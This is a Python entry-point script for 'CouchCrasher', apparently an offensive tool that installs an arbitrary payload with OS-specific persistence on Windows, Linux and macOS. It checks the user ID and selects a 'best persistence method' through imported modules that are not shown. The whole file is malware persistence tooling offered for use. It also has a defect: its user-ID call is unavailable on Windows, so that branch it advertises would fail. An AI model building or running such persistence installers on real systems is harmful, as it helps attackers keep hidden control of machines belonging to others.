"""
couchcrasher.py: Entry point for the CouchCrasher application.
"""

import os
import sys

from pathlib import Path

from support.core    import Persistence
from support.windows import WindowsPersistence
from support.linux   import LinuxPersistence
from support.macos   import MacPersistence


class CouchCrasher:
    """
    Main class for the CouchCrasher application.
    """

    def __init__(self, payload: str) -> None:
        self._payload = payload
        self._os_variants = {
            'win32':  WindowsPersistence,
            'linux':  LinuxPersistence,
            'darwin': MacPersistence,
        }


    def _verify_payload(self) -> None:
        """
        Verify that the payload exists.
        """
        if not Path(self._payload).exists():
            raise FileNotFoundError(f'Payload {self._payload} does not exist.')


    def _get_os(self) -> str:
        """
        Get the current OS.
        """
        return sys.platform


    def _get_effective_user_id(self) -> int:
        """
        Get the effective user ID.
        """
        return os.geteuid()


    def run(self) -> None:
        """
        Install the payload.
        """
        os = self._get_os()
        if os not in self._os_variants:
            raise NotImplementedError(f'OS {os} is not supported.')

        euid = self._get_effective_user_id()

        print(f'Installing payload {self._payload} for OS {os} with effective user ID {euid}.')

        persistence: Persistence = self._os_variants[os](payload=self._payload, effective_user_id=euid)

        print(f'Best persistence method: {persistence.best_persistence_method()}')

        persistence.install()


if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <payload>')
        sys.exit(1)

    couchcrasher = CouchCrasher(payload=sys.argv[1])
    couchcrasher.run()
